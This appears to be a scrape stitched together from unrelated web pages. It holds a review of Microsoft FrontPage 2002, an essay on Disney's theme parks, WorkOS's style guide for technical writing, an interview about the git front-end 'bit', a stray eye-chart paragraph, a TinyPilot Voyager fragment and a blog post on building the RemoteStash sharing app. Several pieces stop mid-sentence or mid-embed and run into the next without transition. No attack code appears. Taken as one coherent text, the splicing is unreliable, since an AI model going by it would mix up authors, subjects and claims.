<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com//articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com//articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com//articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com//articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com//articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com//articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com//articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com//articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com//articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com//articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com//articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com//articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com//articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right …</p></article></div>

</div></div><div data-block-type="2" id="block-83d26a75802dd2ca90d0"><div><p><span><strong><em>Chapter One: The Past </em></strong></span></p><p>Disney is the envy of every media company, regardless of whether it focuses on film, TV, gaming, music or publishing. In plain terms, there has never been a more dominant entertainment company, globally or in the US. It has a brand that actually matters to consumers, owns franchises that consumers essentially treat like subscription content services, and operates the biggest star-making platforms in the world. And as strong as this platform was at the start of 2019, it exited the year even stronger. In a matter of weeks, Disney’s brand new direct-to-consumer platform acquired 30MM subscribers.</p><p>The deeper we get into the digital era, the more dominant Disney seems to become. After all, it was long expected that the Internet would disrupt dominant media companies and IP via rights infringement and the emergence of myriad user-generated “franchises”. However, one of the biggest storytelling “lessons” in the 20th and early 21th century was that audiences have an unending desire for “more” of the stories they <em>already </em>love. And the Internet has enabled this to an unprecedented degree. You can constantly track production (cast Instagrams, behind-the-scenes featurettes, and leaks on social media), engage in fan communities (message boards and YouTube theory/Easter egg videos), consume endless amounts of fan content (e.g. fanfic and watch-along podcasts), play this content back on demand (e.g. Netflix), and engage in never-ending and constantly updated online multiplayer games (e.g. Star Wars: Battlefront 2). This is a powerful, self-sustaining financial and cultural flywheel. And Disney has many of the franchises that best lend themselves to this model. Many of those they don’t own, such as <em>Harry Potter</em>, have their rights fragmented.</p><p>But what is the strongest, most profitable, most defensible part of Disney’s business in the digital era? Its capex-heavy, physical theme parks.</p><p>There is no simple way to quantify how important this business unit is to Disney. The financial role is obvious. Disney’s Parks &amp; Attractions segment generates nearly 100% more revenue and 60% more profit than Disney’s studio division (which already generates nearly three times the revenue AND three times the gross <em>margins </em>as its primary competitors). By turning hit films into theme park attractions, not only does Disney generate more “upside” from a hit than its competitors do, Disney’s breakeven point for these films is also much lower. But the parks are much more than this direct financial benefit. There is nothing that can compare to the impact of a child being hugged by her heroes. The ability to enjoy your favorite IP as “you” is unique and lasts a lifetime. Consider, for example, how many families have Disneyland photos of their kids with Mickey or Woody on the fridge. Or how many of these kids have kept those photos decades later (and compared them to their eventual spouse’s version of that same photo).</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583704876360_17902"><div>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583704876360_24796"><div><p>And because of real estate scarcity, lengthy build times, enormous capital requirements (exacerbated by<a href="http://en.wikipedia.org/wiki/Baumol's_cost_disease"> Baumol’s Cost Disease</a>), Disney’s theme parks, resorts, and cruises are incredibly difficult to replicate by another Western media company. It would take twenty years and tens of billions of dollars for AT&amp;T/WarnerMedia to receive permits, design attractions, and build a fully operational theme park, for example (and it’d probably be in the middle of nowhere). It’s especially hard to imagine all of this occurring while the company is investing tens of billions per year into HBO Max, new 5G network infrastructure, and maintenance capex (while also sustaining tens of billions in dividends and debt service, and fending off agitated investors). Comcast/Universal has an ambitious plan to grow its parks footprint, including new resorts in Russia, South Korea, and Singapore. However, these will take years and tens of billions of dollars. Purely comping the number of parks also overlooks the scale differential. Disney’s Orlando resort, for example, is over 25,000 acres (half used). Universal Studios Orlando is barely 500. In addition, Disney operates four cruise ships (another three are due by 2023), while no competitor does. Overall, Disney’s theme parks business generates more than $26B per year with 175MM+ visitors, compared to 6B for Universal Studios, with 50MM.</p><p>However, the defensibility and value of these businesses goes beyond physical and financial barriers to entry; running a successful theme park means far more than designing a fun ride. Giving real hugs to kids is incredibly dangerous — doing this reliably, safely, and positively millions of times per year requires enormous training (the parks also operate hospitals, pet day care and police services, too!). In addition, these parks must cater to a wide variety of different customers with different needs, physical capabilities, and developmental maturity. In contrast, a film or TV show has only one version that lasts forever and is infinitely repeatable with 100% consistency. There is no other “medium” in the entertainment industry that requires melding more art forms (e.g. live performance, set design, music, engineering) with a smaller margin for error, and at such a great scale. The benefit, though, is a rich, hard to replicate and intimate understanding of the consumer.</p><p>The competitive consequences are profound and only growing. Fans simply cannot enjoy DC or Lord of the Rings or Dragon Ball the way they do Disney’s Princesses, Pixar, most recently, Star Wars, and soon, the Avengers franchises. This fundamentally limits a franchise’s ability to grow love — the lifeblood (and profit driver) of all IP-based companies.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583703445914_105588"><div>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583703445914_134473"><div><p>This is why brands like 20th Century Fox and WarnerMedia license their theme park IP from super-popular brands like <em>Avatar</em>, <em>The Simpsons</em>, and <em>Harry Potter</em> to their competitors, Disney and Universal. Nintendo also partnered with Universal for its theme park rights. This extension is strategically important and financially valuable, but it’s also quite costly. The rights owner, for example, neither owns the customer relationship nor do they deliver the end-customer experience (in a weird way, Universal has a closer relationship with <em>Harry Potter</em> fans than WarnerMedia does). In addition, the majority of associated profits go to the park operator — who also gets to intermingle their IP and draft off the popularity of their competitors’ franchises, too. That’s risky in an age where franchises and <a href="https://www.matthewball.vc/all/disneylessons">clarity of franchise ownership is key</a>.</p><p>So, as we embrace the digital era, it’s funny to consider the enduring and durable significance of the analogue theme parks business. It is incredibly profitable and will continue to grow as new mobile technology/personalization enhance the park-going experience. The barriers to replication are incredibly high and span both fixed investment (land and infrastructure) and skillset (e.g. design and boots-on-the-ground operations). It also offers an intimate understanding of the consumer, is particularly potent when connected to an IP flywheel, and is able to constantly renew its appeal through new attractions and updates.</p><p><span><strong><em>Chapter Two: The (Start of the) New Theme Parks</em></strong></span></p><p>These parks exist and thrive because of our desire to be “inside a living story”. This was Walt’s primary goal with Disneyland: to go beyond passive consumption and into active immersion. Consider the following quote from one of Disney’s chief Imagineers: </p><blockquote><p><em>“Disneyland is an experience involving many moving parts in harmony, like an orchestra. Everything has to be tuned, what you hear, what you smell, what you see, how you see it, the speed at which you assimilate all of that, just like a film, is choreographed. But how do you choreograph that if you don't control the camera, because the camera is you — it's you when you come to Disneyland".</em></p></blockquote><p>This idea of agency is key. There’s only so much time one can spend in a physical or virtual world as a pre-defined character. That doesn’t mean we want to remain an exact replica of our “IRL” selves — we might want to be taller, or blue, or metal, and so on. But when you’re <em>specifically </em>Iron Man, there are limits to what you can look like, how you can behave, what you can do or be, where you can go, and how long it makes sense to be there. After all, you can’t actually be Iron Man, just pretend to be. And certainly, it doesn’t make sense if all of your friends are all Iron Man, too.</p></div></div><div data-block-json="{&quot;cache_age&quot;:&quot;3153600000&quot;,&quot;authorUrl&quot;:&quot;https://twitter.com/DonaldMustard&quot;,&quot;width&quot;:550,&quot;resolveObject&quot;:&quot;Tweet&quot;,&quot;html&quot;:&quot;<blockquote class=\&quot;twitter-tweet\&quot;><p lang=\&quot;en\&quot; dir=\&quot;ltr\&quot;>In Fortnite you will always be you.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Coding is easy, writing is hard. We like to joke here that as developers, we're great at writing words... just not in full sentences! However, producing great technical content is a core part of the WorkOS DNA, and so we've had to learn how to do just that (thank you <a href="https://technically.dev/">Justin Gage</a> for the early guidance). </p><p>Below, we've shared our style guide for technical blogs, tutorials, and documentation. It is meant to be descriptive, not prescriptive, and was written by a developer for other developers... writing for developers.</p><h2>Guiding principles</h2><p>The audience for WorkOS content (i.e. blogs and documentation) is software engineers. The content we publish should:</p><ol start="" role="list"><li>Demonstrate deep expertise to develop trust with readers. “They are a developer and they’ve dealt with my problem” is the perception we should cultivate from developers.</li><li>Be respectful of readers’ time by always being valuable. Our content should <strong>not</strong> be thinly veiled sales pitches or lazy fluff for the sake of volume. </li></ol><p>In short, be that one really amazing instructor who was not only deeply knowledgeable, but also knew how to communicate effectively, and was still cool, relatable, and enthusiastic about teaching.</p><h2>Voice and tone</h2><p><em>Content should strive to be relatable, like we’re on the same team as the readers - think the Principal Engineer who never makes you feel stupid and is delighted to share knowledge and participate in your growth. Let’s go on an adventure of learning together!</em><br></p><ul role="list"><li><strong>Human.</strong> Be educative but deeply empathetic, an expert but quietly confident. </li><li><strong>Wry. </strong>Give the readers a wink sometimes with humor they can relate to.<strong> </strong>Big companies are generally less able to make knowing references to internet culture / the overall zeitgeist. Us doing this makes it clear that WorkOS <em>gets it</em>. </li></ul><h2>Language</h2><p><em>Content should read as though written by a developer for developers.</em><br></p><ul role="list"><li><strong>Clear.</strong> Avoid jargon and slang. Acronyms and abbreviations should be explained on first reference.</li><li><strong>Simple. &nbsp;</strong>Get to the point and avoid unnecessary complexity, redundancy, and verbal garnish. </li><li><strong>Accurate. </strong>Be specific and use terminology and phrases used by developers.</li><li><strong>Inclusive.</strong> Not only do we want to engage the readers, we want to include <strong>all </strong>of them. When writing about fictional people, switch up the pronouns (he / she / they) and consider using names from different cultures. Be judicious about cultural references that could be lost on some readers.</li></ul><figure><p><img src="https://assets-global.website-files.com/5f03ef1d331a69193fae6dcd/5fb5ee2d6fe8d74b10e453ff_webflow.png" loading="lazy" alt=""></p><figcaption>Examples for language choice. Avoid corporate <a href="http://www.andrewdavidson.com/gibberish/?companyname=WorkOS">gibberish</a> and <a href="https://www.youtube.com/watch?v=4ab2ZeZ-krY">jargon</a> at all costs.</figcaption></figure><h2>Grammar and mechanics</h2><p><em>Correctness matters but don’t get too hung up on perfection and minutiae. While </em><a href="https://styleguide.mailchimp.com/grammar-and-mechanics/"><em>Mailchimp’s guide</em></a><em> is good enough for most specifics, below are some additional rules to follow.</em><br></p><ul role="list"><li>Favor (un)ordered lists over inline lists to break up walls of text and make content easier to scan and digest.</li><li>Capitalize the start of every list item and end with a period.</li><li>Use italics and bolding to emphasize and highlight important takeaways.</li><li>Headings should use sentence case instead of title case.</li><li>There should be a single space before and after dashes and slashes, i.e. “foo / bar ” and “foo - bar”. </li><li>There should be a single space after periods.</li><li>Use Oxford commas, i.e. “foo, bar, and baz”, <strong>not</strong> “foo, bar and baz”.</li><li>Use block quotes when quoting more than a sentence. Anything shorter should be quoted inline.</li><li>Keep sentence structure simple, e.x. avoid more than three nested or chained clauses.</li><li>Use abbreviations or domain slang when possible to keep the voice human, e.x. “specs” instead of “specifications”, “JS” instead of “JavaScript”, and “local dev” instead of “local development environment”.</li></ul><h2>Content and structure</h2><ul role="list"><li><strong>Be factual. </strong>Avoid phrases like “some have said that” and instead use positive assertions that you <em>could provide evidence for if asked</em>. Engineers are on alert for claims they can poke holes in, and once found, their trust in us is shattered. Be careful not to use social proof as a crutch. If referring to a user, describe exactly the value that the user receives from the product or feature.</li><li><strong>Link to docs or more details whenever appropriate and possible 🔥</strong>‍</li><li><strong>Use examples.</strong> Abstract ideas or descriptions of complex processes should be clarified and augmented with examples, i.e. code snippets, diagrams, analogies, graphs, screenshots, GIFs, and etc. Code snippets should be in Python &gt;= 3.7.x if the content is not language-specific. All code snippets should be functionally correct, use <strong><em>code formatting</em></strong>, and follow generally accepted style rules.<strong>‍</strong></li><li><strong>Don’t be afraid to get technical.</strong> Since we expect our audience to feel comfortable reading a fairly technical document, including technical details can<strong> </strong>not only be clarifying, but also make it clear that our content is not just an arm of our marketing function.<strong>‍</strong></li><li><strong>Provide context</strong>. Give the reader a starting point so they understand the purpose, scope, and value of the content we’d like them to consume.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="js-article">
    <p><em>This interview was hosted by Jackson Kelley from Console originally posted <a href="https://console.substack.com/p/console-23">here</a></em></p>
<h3 id="what-is-your-background">What is your background?</h3>
<p>I was born and raised in NY. I started off with the privilege of working as an intern at Google. I then moved on to working in FinTech, InsurTech, and now Construction Tech (ConstruTech?). I enjoy my fair share of table tennis and gaming. (Fun fact: I once reached the #1 rank on the StarCraft 2 ladder (2v2s))</p>
<p>My first foray into programming was in High School. I took a computer science intro course and made some cool things like a flash game where each sprite was a meme from Reddit rage comics. However, I didn’t feel confident in my programming abilities and ended up majoring in Accounting instead. I quickly realized that Accounting was not for me 😅 and switched to Finance. Halfway through college, I started reading about programming and it “clicked”. I began experimenting with Android programming (Shout out to <a href="https://www.amazon.com/Android-Programming-Ranch-Guide-Guides/dp/0321804333">The Big Nerd Ranch Guide</a>) and never stopped coding since then. You can check out my old Flappy Bird inspired Android game <a href="https://play.google.com/store/apps/details?id=com.walz.joltimate.downfall2&amp;hl=en_US">here</a>. All in all, I graduated with a B.S. in Finance and a minor in Computer Science.</p>
<p>My favorite language is Go but I mostly use Java and JavaScript during work. I try to steer away from using frameworks when I can but I like the Go web framework Echo. I use React + Redux although I’ve come to realize over time that Redux is overused and leads to too much global state.</p>
<h3 id="why-do-you-try-to-avoid-frameworks">Why do you try to avoid frameworks?</h3>
<p>Frameworks tend to have magic which can be convenient but also frustrating to work with when you want more customization or you’re dealing with a nasty bug which turns out to be the framework silently undermining you. This is not to say that you shouldn’t use frameworks and it goes on a case by case basis.  Frameworks are usually “high level” and hide details. This is convenient but if you’re simply seeking to learn how to code this may not be beneficial.</p>
<p>Libraries are easier to wrap your head around since it will only do something if you explicitly tell it to do so. In turn, one can more easily rule out whether a bug is due to a library for example. The whole system of a computer operates like this to an extent. There are applications built to run on an operating system that runs commands on the kernel which in turn interfaces with the hardware. This system of components and layers is only possible due to API’s/Libraries.</p>
<h3 id="why-was-bit-started">Why was bit started?</h3>
<p>Bit is the summation of a passion for UX, laziness, and a healthy frustration with git’s CLI. Git’s CLI, as many of its users know, has a plethora of commands and options. When you multiply out all the combinations of commands by the number of options and their potential parameters you get A LOT of choices. On top of that, there’s the cornucopia of jargon (detach, head, ref, commit to name a few) and abstruse know-how that, in conjunction, can seduce you into a monotonous hell hole of learning the internal workings of git. Or perhaps put another way – you begin to understand why there is a 500-page book about git. It’s worth pointing out that I like git – but I also enjoy the cathartic pleasure of poking fun at it. Much respect to Linus and all the maintainers that have brought git to where it is today.</p>
<p>So anyway… the inklings of bit began when I started asking myself why doesn’t git’s CLI do this? Why doesn’t git have an undo button? At some point, I said enough is enough, opened an editor, and started writing some code. Bit started out as this grand new git workflow that would completely change the way people would use git. Or at least that was the plan. After developing it and showing it to some friends I got the vibe that perhaps bit was too opinionated and I decided to dial back some of the changes and focus on an improved UX experience. It started all coming together – intelligent suggestions, branches sorted by most recent, proactive fast-forwarding to avoid merge conflicts and full compatibility with all git commands. A lot of this either alleviates the “maintenance” type tasks of git or helps reduce the working memory that git takes to allow you to focus more on the task at hand.</p>
<p>Bit has come a long way in such a short period of time considering the very first commit was only just over a month ago. Seeing all the overwhelmingly positive feedback is almost surreal and I’m thankful to all its supporters.  It’s even cooler working with folks across the world to make bit a bit better each day.</p>
<h3 id="are-there-any-overarching-goals-of-bit-that-drive-design-or-implementation">Are there any overarching goals of bit that drive design or implementation?</h3>
<p>Ease. Of. Use. I love simple interfaces (Google Search, Docker Run, the “Easy Button”).  Google Docs is a powerful interface as well (albeit not quite as simple). It does some complex work behind the scenes such as automatic saving, automatic synchronization &amp; distribution, automatic versioning (yes, Google Docs does that as well). It made me wonder how those principles can be applied to version control.  This became the inspiration for the <code>bit sync</code> command.</p>
<p>Put the onus on the program, not the user. Some of bit’s naysayers claim that higher-order commands (e.g. bit sync, git pull) take away from the user’s understanding. Personally, I find that to be a rather weak argument. Abstractions are powerful. Small interfaces are better than large ones. Bit allows you to use all git commands anyway so the trade-off is mitigated in this way.</p>
<h3 id="what-is-the-most-challenging-problem-thats-been-solved-in-bit-so-far">What is the most challenging problem that’s been solved in bit so far?</h3>
<p>There have been many challenges:  creating a uniform experience across Operating Systems and Shells,  implementing tab completion, displaying fast interactive prompts, simple installs, and lastly learning lots about git itself 😅. I’d say the biggest challenge I solved(ish) is marketing! Marketing is hard. Even harder for programmers. I posted all over the internetz. Reddit, Discord, Twitter, StackOverflow, and even got my first couple of Stars via a link from another Github repo. Of course, Hacker News was the most successful, hitting #2 on the front page. Interestingly, the first time I posted it fell by the wayside with a measly 5 points 🤷‍♂️. All of this marketing took a lot of time and consideration to get the messaging right on the posts and the landing page (Github README). Not to mention the worry that it’d all be for naught.</p>
<h3 id="is-bit-intended-to-eventually-be-monetized-if-it-isnt-monetized-already">Is bit intended to eventually be monetized if it isn’t monetized already?</h3>
<p>Git is free and open-source so I feel it is only right to continue forward in that spirit and keep bit free and open-source.</p>
<p><a href="https://github.com/sponsors/chriswalz">Donations</a> are welcome though (wink, wink)!</p>
<h3 id="where-do-you-see-bit-heading-next">Where do you see bit heading next?</h3>
<p>Continued innovation of the UX. Polishing the small details that “delight the user.” The dream goal would be to make such an impact that Git’s CLI UX itself would improve due to the success of bit. Another interesting avenue would be bit aliases that could be written in Go. I hope bit inspires future developers about how the CLI experience, in general, can be improved. I think <a href="https://fishshell.com/">Fish</a> is doing great work on this front (I had the pleasure of discovering it during my research for bit).  I look forward to the continuing innovation of the shell/CLI space.</p>
<h3 id="where-do-you-see-software-development-in-general-heading-next">Where do you see software development, in general, heading next?</h3>
<p>Tough question! There are many possibilities considering how quickly innovation happens nowadays. My instinct tells me “No-Code” and “Low-Code” solutions will become increasingly common. Perhaps it will be more visually based where a designer literally draws out a system and an AGI figures out the details (or vice-versa). Maybe even further into the future we will all be hooked up to a Neuralink and code will just spew out of our brains and then we’ll all understand why there’s a programming language called Brain****.</p>
<h3 id="where-do-you-see-open-source-heading-next">Where do you see open-source heading next?</h3>
<p>I’m rather new to open-source so take my thoughts with a grain of salt. Open-source appears to have a bright future. There seems to be a need for continued innovation around licensing to prevent companies from taking advantage of open-source projects.</p>
<p>GitHub introduced Sponsoring is a fantastic way to <a href="https://github.com/sponsors/community">give back</a> to the open-source community.</p>
<p>I think there should be significantly more financial support for projects. It’s unfortunate to see so many projects stop getting maintained over time considering how fundamental they are to companies, big and small. Perhaps implementing some sort of government open-source Incentive program that encourages businesses to donate to open-source projects would make open-source flourish even more.</p>
<p>Also, bringing more attention to open-source through what Console is doing is really great to see.</p>
<h3 id="what-is-one-question-you-would-like-to-ask-another-open-source-developer-that-i-didnt-ask-you">What is one question you would like to ask another open-source developer that I didn’t ask you?</h3>
<p>How do you go about resolving an issue (specifically bugs) that a user files?</p>
<h3 id="what-is-the-best-way-for-a-new-developer-to-contribute-to-bit">What is the best way for a new developer to contribute to bit?</h3>
<p>Submitting issues &amp; pull requests is nice. Also, changes to the README is quite useful (even with all the fallout from Hacktoberfest!). Look at the <a href="https://github.com/chriswalz/bit/issues">issues</a> page and look for “good first issue” labels. Also, if you feel like you <a href="https://en.wikipedia.org/wiki/Impostor_syndrome">don’t know what you’re doing</a> – don’t worry, no one does 😛.</p>

        You have healthy visual acuity if you can read the first line at the prescribed distance. The overwhelming
        majority of people will be unable to read beyond the first four. There are anecdotal accounts of humans with
        20/1 vision; such people, if they indeed exist, could read the -1.22 line. The remaining lines are likely beyond
        the ability of any living person.

<h2 id="all-in-one-design">All-in-one design</h2>
<p>Voyager's most obvious new feature is its case. The original TinyPilot captured video through an external USB dongle, but I wanted something simpler.</p>
<p>I worked with 3D-printing experts to design a custom case for TinyPilot. The case is made from a carbon fiber material that's both lightweight and durable. To keep the device cool, the Voyager features a low-noise fan. Best of all, it allows you to plug an HDMI cable right into the device.</p>

<h2 id="improved-video-capture">Improved video capture</h2>

<p>I mostly work and play within the Apple ecosystem and <a href="https://support.apple.com/en-gb/HT204144">AirDrop</a>, <a href="https://support.apple.com/en-gb/HT204681">Continuity</a> and other integration between devices is extremely useful and convenient. <a href="https://llguy.github.io/">My son</a> recently converted himself to Linux and started to miss the ability to easily move photos, text, or url between his phone and his Linux computer. Being a hacker himself, he thought it would be a great idea to devise an app that let’s you move information from your phone to your computer, and more generally a “cross platform AirDrop substitute for geeks”…</p>



<p>Of course, one solution would be to <a href="http://www.google.com/search?q=how+to+airdrop+to+linux">google</a> and figure out if such an app exists, but where is the fun in that? We decided to take on a Father-Son new project and build our own solution. </p>



<p>The result ended up surprisingly useful, we made it open-source, you can find the <a href="https://github.com/roznet/remotestash">working code here</a> and the <a href="https://apps.apple.com/us/app/remotestash/id1516090251?ls=1">app on the store</a>. As we learned a few new technologies along the way, we decided to write about the approach as hopefully it could be useful to other.</p>



<p>In this first part, we’ll go over the overall approach, then the iPhone Application implementation and finally the python implementation on the computer.</p>



<h2>The Philosophy</h2>



<p>My son’s philosophy being “anything beyond using a <a href="https://en.wikipedia.org/wiki/Network_socket">socket API</a> and crafting your own network packets would be too high level”, he started writing some <a href="https://en.wikipedia.org/wiki/C_(programming_language)">C code</a>, building his own protocol, communicating with a cloud server he rents on <a href="https://www.digitalocean.com/">Digital Ocean</a> with his weekly allowance.</p>



<p>I wanted to take the opportunity to show him how to leverage higher level libraries even languages like python to get the desired result quickly. We targeted to get a proof of concept, including learning the require component within one week-end. No choice but to leverage existing frameworks…</p>



<p>The philosophy of the tool would be on the phone to be as user friendly and natively integrated to the phone system as possible. On the computer it would be natural for a linux geek, command line based and loosely inspired by some of the <code>git</code> concept of <code>pull</code>, <code>push</code> and <code>stash</code>. No fancy UI and definitely no mouse. Using the mouse is probably more of an heresy for my son that using a high-level library. He lives in the terminal, emacs and the i3 tile window manager. We would also try to be as generic as possible on the items that could be shared, images, text, files, but start with the basic he needed: text, url and photos.</p>



<h2>The Approach</h2>



<p>We needed to decide on three core components: how to store and track the items to be shared – the stash, how the devices would discover each other on the network and how to share the actual items on the network across devices</p>



<h3>stash</h3>



<p>We needed to keep that simple. No database or anything complex, we went for a linux like approach of keeping a dot directory in the home of the user where the supporting files would be kept as well as the actual items themselves saved as files.</p>



<h3>discovery</h3>



<p>The gold standard for service discovery seems to be <a href="https://en.wikipedia.org/wiki/Zero-configuration_networking#Apple_Bonjour">Bonjour or ZeroConf</a>. It appears to have started as an Apple technology, but is a standard used by most device these days. A quick review of the docs showed that it was exactly what we needed. Enables discovery of devices services on the network and we should share small payload of information as well. And of course it was multi-platform with convenient library in the Apple iOS development environment and python.</p>



<h3>Sharing</h3>



<p>The most obvious approach to share files between devices seem to be using http/https. Widely supported, easy to debug with many existing tools and of course it supports all kind of format that we needed. python and iOS have great support to do requests and good libraries to implement simple servers. One issue was that on iOS, an app needs to use the https protocol, but a quick search lead to a great little library to implement a server that supports https on iPhone called <a href="https://criollo.io/">Criollo.</a></p>



<h2>Last Missing Pieces</h2>



<p>Before we could really start, two major pieces remained to be agreed: the name and the icon!</p>



<p>Again two philosophies and two contenders for the name. The teen cool factor approach: <code>Galactic Clipboard</code> or the middle-age practical and plain one: <code>Remote Stash</code>. Because I was quicker to create the GitHub repo and I control our Apple Developer account for the App, I won with <a href="https://github.com/roznet/remotestash">RemoteStash</a>…</p>



<p>The Icon was less contentious. Turns out a teen living in an emacs and terminal environment is less interested in icons, so I quickly put one together</p>



<div><figure><img loading="lazy" width="150" height="150" src="https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x-150x150.png?resize=150%2C150&amp;ssl=1" alt="" srcset="https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=150%2C150&amp;ssl=1 150w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=300%2C300&amp;ssl=1 300w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=1024%2C1024&amp;ssl=1 1024w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=768%2C768&amp;ssl=1 768w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=1536%2C1536&amp;ssl=1 1536w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=2048&amp;ssl=1 2048w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=1168&amp;ssl=1 1168w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=1752&amp;ssl=1 1752w" sizes="(max-width: 150px) 100vw, 150px" data-recalc-dims="1"></figure></div>



